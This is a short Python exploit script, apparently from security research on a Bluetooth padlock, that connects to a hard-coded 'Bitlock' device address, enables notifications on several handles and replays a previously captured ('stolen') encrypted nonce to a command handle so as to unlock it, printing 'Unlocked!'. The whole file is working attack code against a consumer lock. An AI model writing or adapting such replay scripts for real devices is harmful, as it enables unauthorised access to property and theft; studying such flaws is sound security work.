#!/bin/python

# Unlock Bitlock using encrypted nonse stolen using Bleno & Raspberry Pi

import time
from scapy.all import *
from BTLE import *

def main():
   s = bindsock()
   rand = "00"
   Connect(s, "263DCFD5B370", rand)

   writereq(s, "2B00","0100")
   writereq(s, "3200","0100")
   writereq(s, "3800","0100")
   writecmd(s, "2D00","f3a496419aac4b0eee73a6b186daa590")
   
   print("Unlocked!")
   time.sleep(5)
   disconnect(s)

if __name__ == "__main__":
    main()
